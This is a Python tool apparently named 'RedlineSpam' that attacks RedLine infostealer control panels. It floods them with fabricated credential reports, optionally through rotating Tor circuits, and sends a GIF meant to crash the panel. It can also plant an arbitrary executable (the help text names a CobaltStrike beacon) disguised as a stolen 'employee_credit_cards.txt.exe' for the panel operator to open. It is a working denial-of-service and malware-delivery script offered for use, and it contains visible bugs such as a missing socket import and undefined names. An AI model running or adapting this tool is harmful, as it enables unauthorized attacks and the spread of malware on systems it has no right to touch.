import os
import requests
import xmltodict
import json
import random
import uuid
import string
from random import getrandbits
from ipaddress import IPv4Address
import pycountry
from faker import Faker
import barnum
import numpy
from PIL import Image
import base64
import io
import sys
import argparse
import socks
from sockshandler import SocksiPyHandler
from stem import Signal
from stem.control import Controller

fileFirstnames = "first-names.txt"
fileLastnames = "last-names.txt"
fileEmails = "mail-domains.txt"
fileDomains = "domains.txt"
fileCountrycodes = "iso_country_codes.txt"
fileSoftware = "applications.txt"
fakeDomains = []
tor_password = "MyStr0n9P#D"


class RedlineSettings:
    """MyClass class instance"""

    def __init__(self, grabbrowsers, grabftp, grabfiles, grabimclients, grabpaths):
        self.grabbrowsers = grabbrowsers
        self.grabftp = grabftp
        self.grabfiles = grabfiles
        self.grabimclients = grabimclients
        self.grabpaths = grabpaths


class ColorPrint:
    @staticmethod
    def print_fail(message, end='\n'):
        sys.stderr.write('\x1b[1;31m' + message + '\x1b[0m' + end)

    @staticmethod
    def print_pass(message, end='\n'):
        sys.stdout.write('\x1b[1;32m' + message + '\x1b[0m' + end)

    @staticmethod
    def print_warn(message, end='\n'):
        sys.stderr.write('\x1b[1;33m' + message + '\x1b[0m' + end)

    @staticmethod
    def print_info(message, end='\n'):
        sys.stdout.write('\x1b[1;34m' + message + '\x1b[0m' + end)

    @staticmethod
    def print_bold(message, end='\n'):
        sys.stdout.write('\x1b[1;37m' + message + '\x1b[0m' + end)


def print_header():
    ColorPrint.print_pass("  _____          _ _ _             _____")
    ColorPrint.print_pass(" |  __ \        | | (_)           / ____|")
    ColorPrint.print_pass(" | |__) |___  __| | |_ _ __   ___| (___  _ __   __ _ _ __ ___")
    ColorPrint.print_pass(" |  _  // _ \/ _` | | | '_ \ / _ \\\\___ \| '_ \ / _` | '_ ` _ \\")
    ColorPrint.print_pass(" | | \ \  __/ (_| | | | | | |  __/____) | |_) | (_| | | | | | |")
    ColorPrint.print_pass(" |_|  \_\___|\__,_|_|_|_| |_|\___|_____/| .__/ \__,_|_| |_| |_|")
    ColorPrint.print_pass("            [ Pew, pew, pew ]           | |                    ")
    ColorPrint.print_pass("            [ @hariomenkel  ]           |_|                    ")
    print("\n")


def test_tor():
    try:
        tor_c = socket.create_connection(('127.0.0.1', 9051))
        payload = 'AUTHENTICATE "{}"\r\nGETINFO status/circuit-established\r\nQUIT\r\n'.format(tor_password)
        tor_c.send(payload.encode())

        response = tor_c.recv(1024)
        tor_c.close()
        if 'circuit-established=1' not in str(response):
            return False
        else:
            return True

    except Exception as e:
        print("Could not connect to Tor: " + str(e))
        print("Please make sure Tor is installed!")
        return False


def get_current_ip():
    session = requests.session()
    session.proxies = {}
    session.proxies['http'] = 'socks5h://localhost:9050'

    try:
        r = session.get('http://ipinfo.io/ip')
    except Exception as e:
        print("Error while getting IP: " + str(e))
    else:
        return r.text


# Please check README to make this work!
def renew_tor_ip():
    print("Renewing Tor IP now")
    with Controller.from_port(port=9051) as controller:
        controller.authenticate(password=tor_password)
        controller.signal(Signal.NEWNYM)


def get_tor_session():
    session = requests.session()
    # Tor uses the 9050 port as the default socks port
    session.proxies = {'http': 'socks5h://127.0.0.1:9050',
                       'https': 'socks5h://127.0.0.1:9050'}
    return session


def get_settings(url):
    try:
        headers = {'Content-Type': 'text/xml; charset=utf-8',
                   'SOAPAction': 'http://tempuri.org/IRemotePanel/GetSettings'}

        x = requests.post(url, headers=headers,
                          data='<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><GetSettings xmlns="http://tempuri.org/"/></s:Body></s:Envelope>')
        print("Status code: " + str(x.status_code))
        json_result = xmltodict.parse(x.text)
        r = RedlineSettings(
            json_result['s:Envelope']['s:Body']['GetSettingsResponse']['GetSettingsResult']['a:GrabBrowsers'],
            json_result['s:Envelope']['s:Body']['GetSettingsResponse']['GetSettingsResult']['a:GrabFTP'],
            json_result['s:Envelope']['s:Body']['GetSettingsResponse']['GetSettingsResult']['a:GrabFiles'],
            json_result['s:Envelope']['s:Body']['GetSettingsResponse']['GetSettingsResult']['a:GrabImClients'],
            json_result['s:Envelope']['s:Body']['GetSettingsResponse']['GetSettingsResult']['a:GrabPaths'])
    except:
        ColorPrint.print_fail("Unable to download config from " + url + " - Aborting")
        exit()
    return r


def build_payload(weaponization_path):
    fake = Faker()
    countrycode = create_countrycode()
    country = pycountry.countries.get(alpha_2=countrycode)
    number_browsers = random.randint(1, 4)
    base64_payload = ""
    if ((weaponization_path != None) and (os.path.isfile(weaponization_path))):
        print ("Using file " + weaponization_path + " to weaponize...")
        data = open(weaponization_path, "rb").read()
        base64_payload = base64.b64encode(data).decode('utf-8')
    else:
        base64_payload = base64.b64encode(numpy.random.bytes(random.randint(50000,10000000))).decode('utf-8')
        
    payload = '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><SendClientInfo xmlns="http://tempuri.org/"><user xmlns:a="v1/Models" xmlns:i="http://www.w3.org/2001/XMLSchema-instance"><a:AdminPromptType>DimmedPromptForNonWindowsBinaries</a:AdminPromptType>'
    payload += '<a:BuildID>' + ''.join(
        random.choices(string.ascii_uppercase + string.digits, k=random.randint(4, 12))) + '</a:BuildID>'
    payload += '<a:Country>' + countrycode + '</a:Country>'
    payload += '<a:Credentials>'
    payload += '<a:Browsers>'

    for i in range(number_browsers):
        payload += '<a:Browser>'

        payload += '<a:Autofills>'
        for r in range(random.randint(1, 10)):
            payload += '<a:Autofill>'
            payload += '<a:Name>' + create_username() + '</a:Name>'
            payload += '<a:Value>' + create_username() + '</a:Value>'
            payload += '</a:Autofill>'
        payload += '</a:Autofills>'

        payload += '<a:Cookies>'
        for c in range(random.randint(50, 123)):
            payload += '<a:Cookie>'
            payload += '<a:Expires>0</a:Expires>'
            payload += '<a:Host>' + fakeDomains[random.randint(0, len(fakeDomains) - 1)] + '</a:Host>'
            payload += '<a:Http>false</a:Http>'
            payload += '<a:Name>' + ''.join(
                random.choices(string.ascii_uppercase + string.digits, k=random.randint(4, 27))) + '</a:Name>'
            payload += '<a:Path>/</a:Path>'
            payload += '<a:Secure>false</a:Secure>'
            payload += '<a:Value>' + ''.join(
                random.choices(string.ascii_uppercase + string.digits, k=random.randint(10, 34))) + '</a:Value>'
            payload += '</a:Cookie>'
        payload += '</a:Cookies>'

        payload += '<a:Credentials>'
        for p in range(random.randint(7, 23)):
            payload += '<a:LoginPair>'
            payload += '<a:Host>' + fakeDomains[random.randint(0, len(fakeDomains) - 1)] + '</a:Host>'
            payload += '<a:Login>' + create_username() + "@" + fakeDomains[
                random.randint(0, len(fakeDomains) - 1)] + '</a:Login>'
            payload += '<a:Password>' + create_fakepassword() + '</a:Password>'
            payload += '</a:LoginPair>'
        payload += '</a:Credentials>'

        payload += '<a:CreditCards/>'
        payload += '<a:Name>' + create_fake_browser() + '</a:Name>'
        payload += '<a:Profile>Default</a:Profile>'
        payload += '</a:Browser>'

    payload += '</a:Browsers>'
    payload += '<a:Defenders xmlns:b="http://schemas.microsoft.com/2003/10/Serialization/Arrays"><b:string>Windows Defender</b:string></a:Defenders>'
    
    payload += '<a:Files><a:RemoteFile><a:Body>' + base64_payload + '</a:Body><a:FileName>employee_credit_cards.txt.exe</a:FileName><a:SourcePath>C:\\Users\\vladimir\\Desktop\\employee_credit_cards.txt.exe</a:SourcePath></a:RemoteFile></a:Files>'
    payload += '<a:FtpConnections/>'  # No FtpConnections for now
    payload += '<a:Hardwares><a:Hardware><a:Caption>Intel(R) Core(TM) i' + str(random.randint(3, 9)) + '-' + str(random.randint(1000,10000)) + ' CPU @ ' + str(random.randint(1,4)) + '.' + str(random.randint(0,99)) + ' GHz</a:Caption><a:HardType>Processor</a:HardType><a:Parameter>2</a:Parameter></a:Hardware><a:Hardware><a:Caption>Intel(R) Core(TM) i' + str(random.randint(3, 9)) + '-' + str(random.randint(1000,10000)) + ' CPU @ ' + str(random.randint(1,4)) + '.' + str(random.randint(0,99)) + ' GHz</a:Caption><a:HardType>Processor</a:HardType><a:Parameter>2</a:Parameter></a:Hardware></a:Hardwares>'

    payload += '<a:InstalledBrowsers>'
    for i in range(number_browsers):
        payload += '<a:InstalledBrowserInfo>'
        browser = create_fake_browser()
        payload += '<a:Name>' + browser + '</a:Name>'
        payload += '<a:Path>C:\Program Files\\' + browser + '\\' + browser + '.exe</a:Path>'
        payload += '<a:Version>' + create_fakeversion() + '</a:Version>'
        payload += '</a:InstalledBrowserInfo>'
    payload += '</a:InstalledBrowsers>'

    payload += '<a:InstalledSoftwares xmlns:b="http://schemas.microsoft.com/2003/10/Serialization/Arrays">'
    for i in range(random.randint(15, 45)):
        payload += '<b:string>' + create_fake_application() + '</b:string>'
    payload += '</a:InstalledSoftwares>'
    payload += '<a:Processes xmlns:b="http://schemas.microsoft.com/2003/10/Serialization/Arrays">' + create_fake_processes() + '</a:Processes>'
    payload += '</a:Credentials>'
    payload += '<a:CurrentLanguage>' + country.name + ' (' + country.name + ')</a:CurrentLanguage>'
    payload += '<a:HWID>' + uuid.uuid4().hex + '</a:HWID>'
    payload += '<a:IP>' + create_fakeip() + '</a:IP>'
    payload += '<a:IsProcessElevated>false</a:IsProcessElevated>'
    payload += '<a:Location>' + barnum.create_city_state_zip()[1] + '</a:Location>'
    payload += '<a:LogDate>0001-01-01T00:00:00</a:LogDate>'
    payload += '<a:MonitorSize>1918x920</a:MonitorSize>'
    payload += '<a:OS>' + create_windowsversion() + '</a:OS>'
    payload += '<a:Screenshot>' + create_fake_screenshot() + '</a:Screenshot>'
    payload += '<a:TimeZone>' + create_timezone() + '</a:TimeZone>'
    payload += '<a:UserAgent>' + fake.user_agent() + '</a:UserAgent>'
    payload += '<a:Username>' + create_username() + '</a:Username>'
    payload += '</user></SendClientInfo></s:Body></s:Envelope>'
    return payload


def load_fake_domains():
    with open(fileDomains) as sName:
        global fakeDomains
        fakeDomains = sName.read().splitlines()
        return


def create_fake_screenshot():
    # This crashes the Panel/Server once the operator tries to open the entry. NEAT!
    # Redline does not like GIFs.
    with open("rickroll-roll.gif", "rb") as image_file:
        return base64.b64encode(image_file.read()).decode('utf-8')


def create_fake_processes():
    fake_processes = ""
    for i in range(random.randint(25, 50)):
        fake_filename = create_fakepassword() + ".exe"
        fake_processes += '<b:string>ID: ' + str(
            random.randint(300, 4000)) + ', Name: ' + fake_filename + ', CommandLine: </b:string>'
    return fake_processes


def create_fake_application():
    with open(fileSoftware) as sName:
        possible_software = sName.read().splitlines()

        return possible_software[random.randint(0, len(possible_software) - 1)]


def create_fake_browser():
    browsers = ["7Star",
                "360Browser",
                "Amigo",
                "Brave",
                "Bromium",
                "CentBrowser",
                "Chedot",
                "Chromium",
                "CocCoc",
                "ComodoDragon",
                "Cyberfox",
                "ElementsBrowser",
                "Epic",
                "FileZilla",
                "GoBrowser",
                "GoogleChrome",
                "GoogleChrome64",
                "IceDragon",
                "InternetExplorer",
                "InternetMailRu",
                "Kometa",
                "MicrosoftEdge",
                "MozillaFireFox",
                "Mustang",
                "Nichrome",
                "Opera",
                "Orbitum",
                "Outlook",
                "PaleMoon",
                "Pidgin",
                "Psi",
                "PsiPlus",
                "QIPSurf",
                "RockMelt",
                "SaferBrowser",
                "Sputnik",
                "Suhba",
                "Superbird",
                "ThunderBird",
                "TorBro",
                "Torch",
                "Uran",
                "Vivaldi",
                "Waterfox",
                "WinSCP",
                "YandexBrowser"]
    return browsers[random.randint(0, len(browsers) - 1)]


def create_timezone():
    timezone = "UTC"
    bool = random.randint(0, 1)
    if bool == 0:
        timezone += "-"
    else:
        timezone += "+"

    timezone += "0" + str(random.randint(0, 9)) + ":00:00"
    return timezone


def create_username():
    with open(fileFirstnames) as fName:
        firstnames = fName.read().splitlines()

    with open(fileLastnames) as lName:
        lastnames = lName.read().splitlines()

    rand_firstname = random.randint(0, len(firstnames) - 1)
    rand_lastname = random.randint(0, len(lastnames) - 1)

    rand_username_format = random.randint(0, 2)

    if rand_username_format == 0:
        glob_username = firstnames[rand_firstname] + "." + lastnames[rand_lastname]
    elif rand_username_format == 1:
        glob_username = firstnames[rand_firstname][0] + lastnames[rand_lastname]
    elif rand_username_format == 2:
        glob_username = lastnames[rand_lastname] + firstnames[rand_firstname][0]
    return glob_username


def send_record(settings, url, use_tor, tor_session, weaponization_path):
    try:
        headers = {'Content-Type': 'text/xml; charset=utf-8',
                   'SOAPAction': 'http://tempuri.org/IRemotePanel/SendClientInfo'}

        contents = build_payload(weaponization_path)
        if use_tor:
            x = tor_session.post(url, headers=headers, data=contents)
        else:
            x = requests.post(url, headers=headers, data=contents.encode('utf-8'))
        return
    except Exception as e:
        ColorPrint.print_fail("Error while sending report! " + str(e))


def create_fakeversion():
    p1 = random.randint(1, 16)
    p2 = random.randint(1, 4000)
    p3 = random.randint(1, 9999)
    p4 = random.randint(1, 9999)

    return str(p1) + "." + str(p2) + "." + str(p3) + "." + str(p4)


def create_fakepassword():
    min_length = 4
    max_length = 12

    actual_length = random.randint(min_length, max_length)

    x = ''.join(
        random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(actual_length))

    return x


def create_fakecredentialdomain():
    rand_domain = random.randint(0, len(glob_cookiedomains) - 1)
    return glob_cookiedomains[rand_domain]


def create_countrycode():
    country_codes = []
    with open(fileCountrycodes) as cName:
        country_codes = cName.read().splitlines()

    glob_countrycode = country_codes[random.randint(0, len(country_codes) - 1)]
    return glob_countrycode


def create_fakeip():
    bits = getrandbits(32)  # generates an integer with 32 random bits
    addr = IPv4Address(bits)  # instances an IPv4Address object from those bits
    addr_str = str(addr)  # get the IPv4Address object's string representation

    glob_ip = addr_str
    return glob_ip


def create_windowsversion():
    versions = ["Windows 10 Enterprise",
                "Windows 10 Home",
                "Windows Server 2019",
                "Windows Server 2016",
                "Windows 8.1",
                "Windows Server 2012 R2",
                "Windows 8",
                "Windows Server 2012",
                "Windows 7",
                "Windows Server 2008 R2",
                "Windows Server 2008",
                "Windows Vista",
                "Windows Server 2003 R2",
                "Windows Server 2003",
                "Windows XP"]

    windowsversion = versions[random.randint(0, len(versions) - 1)]
    return windowsversion + " " + create_fakearchitecture()


def create_fakearchitecture():
    bool = random.randint(0, 1)
    if bool == 0:
        return "x64"
    else:
        return "x32"


load_fake_domains()

if __name__ == '__main__':
    print_header()
    parser = argparse.ArgumentParser(description='RedlineSpam - A tool to flood Redline panels with fake credentials')
    parser.add_argument("--url", help="URL of the panel pointing to the index.php", type=str, required=True)
    parser.add_argument("--report_count", help="Number of fake reports to send - 0 for infinite number", type=int,
                        required=True)
    parser.add_argument("--use_tor", help="Should tor be used to connect to target?", default=False,
                        type=lambda x: (str(x).lower() == 'true'), required=True)
    parser.add_argument("--weaponization_path", help="Path to an .exe file you want to send to the attacker as stolen data disguised as document (e.g. CobaltStrike beacon)", type=str, required=False)

    args = parser.parse_args()

    tor_session = None
    if args.use_tor:
        if test_tor:
            tor_session = get_tor_session()
        else:
            ColorPrint.print_error("Tor is not working - please check!")
            exit()

    if args.url:
        r = get_settings(args.url)

        if args.report_count > 0:
            for i in range(args.report_count):
                ColorPrint.print_info("Now sending item #" + str(i))
                if args.use_tor:
                    if i % 50 == 0:
                        renew_tor_ip()
                send_record(r, args.url, args.use_tor, tor_session, args.weaponization_path)
        else:
            counter = 0
            while 1 == 1:
                print("Now sending item #" + str(counter))
                if args.use_tor:
                    if i % 50 == 0:
                        renew_tor_ip()
                send_record(r, args.url, args.use_tor, tor_session, args.weaponization_path)
                counter = counter + 1
